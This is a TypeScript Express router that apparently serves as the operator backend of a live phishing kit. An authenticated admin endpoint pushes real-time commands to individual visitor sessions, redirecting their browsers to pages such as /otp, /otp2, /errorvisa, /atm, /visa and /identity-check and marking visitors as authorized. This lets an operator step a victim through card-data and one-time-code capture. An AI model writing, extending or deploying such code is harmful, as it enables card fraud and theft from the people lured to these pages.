import { Router, type IRouter } from "express";
import { setControl, peekControl, type ControlAction } from "../lib/control-store";
import { extractToken, validateToken } from "../lib/auth";
import { sendSSEMessage, hasConnectedClients } from "../lib/sse-store";
import { authorizeVisitor, addAllowedPage } from "@workspace/db";

const router: IRouter = Router();

// Map action to page path
const actionToPage: Record<string, string> = {
  "go_otp": "/otp",
  "go_otp2": "/otp2",
  "go_otp3": "/otp3",
  "card_error": "/errorvisa",
  "go_nomer": "/nomer",
  "nomer_error": "/errorvisa",
  "go_nomer_wait": "/waiting",
  "go_nomer_otp": "/otp",
  "go_home": "/",
  "go_form": "/form",
  "go_select": "/select",
  "go_visa": "/visa",
  "go_atm": "/atm",
  "go_total": "/total",
  "go_total2": "/total2",
  "go_waiting": "/waiting",
  "identity_code": "/identity-check",
  "go_identity_check": "/identity-check"
};

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

// Legacy endpoint - returns current control without consuming it
router.get("/control/:sessionId", (req, res): void => {
  const raw = req.params.sessionId;
  const sessionId = Array.isArray(raw) ? raw[0] : raw;
  const control = peekControl(sessionId);
  res.json(control ?? { action: null });
});

// Legacy endpoint - kept for backwards compatibility
router.delete("/control/:sessionId", (_req, res): void => {
  res.json({ success: true, action: null, message: "Use SSE endpoint instead" });
});

// Admin sends a control command - broadcasts via SSE immediately
router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
  try {
    const rawSessionId = req.params.sessionId;
    const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
    const { action, code, authorize } = req.body as { action?: string; code?: string; authorize?: boolean };

    const allowed: ControlAction[] = [
      "go_otp", "go_otp2", "go_otp3", "card_error",
      "go_nomer", "nomer_error", "go_nomer_wait", "go_nomer_otp",
      "go_home", "go_form", "go_select", "go_visa", "go_atm",
      "go_total", "go_total2", "go_waiting",
      "identity_code", "go_identity_check"
    ];

    if (!action || !allowed.includes(action as ControlAction)) {
      res.status(400).json({ error: "Invalid action" });
      return;
    }

    // If authorize flag is true, set visitor as authorized before sending redirect
    if (authorize === true) {
      authorizeVisitor(sessionId).then((success) => {
        console.log(`[Control] Visitor ${sessionId.substring(0, 8)}... authorized: ${success}`);
      }).catch((err) => {
        console.error("[Control] Failed to authorize visitor:", err);
      });
    }

    // Always add the target page to allowed pages when redirecting
    const targetPage = actionToPage[action];
    if (targetPage && targetPage !== "/") {
      addAllowedPage(sessionId, targetPage).then((success) => {
        console.log(`[Control] Added page access ${targetPage} for session ${sessionId.substring(0, 8)}...: ${success}`);
      }).catch((err) => {
        console.error("[Control] Failed to add page access:", err);
      });
    }

    // Also save to control store for legacy support
    setControl(sessionId, action as ControlAction, code);

    // Send via SSE for immediate delivery
    const hasClients = hasConnectedClients(sessionId);

    if (hasClients) {
      // Broadcast via SSE - client will receive immediately
      sendSSEMessage(sessionId, "control", {
        action,
        code,
        authorized: authorize === true,
        timestamp: Date.now()
      });
      console.log(`[Control] SSE broadcast sent to session: ${sessionId}`);
    } else {
      console.log(`[Control] No SSE clients connected for session: ${sessionId}, saved to store`);
    }

    res.json({
      success: true,
      sessionId,
      action,
      code,
      delivered: hasClients ? "sse" : "store"
    });
  } catch (error) {
    console.error("[Control] Error processing control command:", error);
    res.status(500).json({ error: "Failed to process control command", details: String(error) });
  }
});

export default router;
